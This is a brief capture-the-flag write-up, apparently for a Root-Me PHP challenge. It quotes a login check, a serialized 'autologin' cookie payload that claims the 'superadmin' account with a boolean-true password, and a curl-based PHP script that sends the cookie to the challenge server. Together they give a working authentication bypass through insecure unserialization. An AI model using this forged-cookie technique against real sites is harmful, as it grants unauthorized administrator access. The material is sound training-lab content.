```php
<?php

// message ?
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?>
```

Payload: change the autologin as follow
```
a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
```

PHP script:
```php
<?php
$c = array('login' => 'superadmin', 'password' => TRUE);
$cmd = 'curl -s -i -X GET -b "autologin=' . urlencode(serialize($c)) . '" "http://challenge01.root-me.org/web-serveur/ch28/index.php"';
echo shell_exec($cmd);
?>
```